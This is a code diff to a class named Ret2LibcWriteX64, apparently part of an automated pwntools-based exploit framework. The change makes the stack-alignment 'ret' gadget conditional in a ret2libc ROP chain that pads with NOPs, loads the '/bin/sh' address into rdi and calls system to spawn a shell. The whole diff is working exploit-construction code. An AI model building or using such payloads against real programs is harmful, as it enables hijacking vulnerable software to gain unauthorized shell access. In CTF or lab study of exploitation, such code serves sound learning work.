@@ -292,6 +292,18 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         affected by ``extra_rdi`` because the stage-2 ret uses
         ``pop rdi; sh; ret; system`` — when ``pop rdi; pop <reg>; ret``,
         v3.1 inserts a 0 placeholder to consume the extra slot.
+
+        v4.0.5 (P6.4c fix, B-007 extension): the stack-alignment
+        ``ret`` gadget is no longer hard-coded.  It is included
+        iff ``ctx.frame_context.required_ret_count == 1``
+        (computed by ``recon.frame.compute_required_ret_count`` from
+        the caller's ``lea_offset`` — see ``fix.md`` §3.1).  This
+        **replaces** the v4.0.2b magic-number heuristic
+        ``include_ret = (padding < 32)`` with a principled decision
+        based on real ABI arithmetic.  When ``ctx.frame_context`` is
+        ``None`` (defensive — orchestrator always populates it now),
+        defaults to including ``ret`` to preserve the v4.0.1
+        always-align behaviour.
         """
         from pwn import asm, flat, p64
 
@@ -314,20 +326,33 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         except (KeyError, AttributeError, StopIteration):
             return b""
 
+        # v4.0.5: principled ret-count from FrameContext (default
+        # True keeps v4.0.1 always-align behaviour when the recon
+        # phase did not populate frame_context — defensive fallback).
         g = ctx.gadgets_x64
+        include_ret = bool(
+            ctx.frame_context.required_ret_count
+            if ctx.frame_context is not None
+            else 1
+        )
+        ret_gadget = p64(g.ret) if include_ret else b""
+
         if g.extra_rdi == 1:
             # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
+            # to consume the extra ``pop <reg>`` slot.  The 0 here is
+            # **independent** of the alignment ``ret`` — it stays in
+            # both branches.  ``ret_gadget`` is conditionally appended.
             return flat(
                 asm("nop") * ctx.padding
                 + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
-                + p64(g.ret)  # stack-alignment gadget
+                + ret_gadget
                 + p64(system_addr)
             )
         # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
         return flat(
             asm("nop") * ctx.padding
             + p64(g.pop_rdi) + p64(sh_addr)
-            + p64(g.ret)  # stack-alignment gadget
+            + ret_gadget
             + p64(system_addr)
         )
 
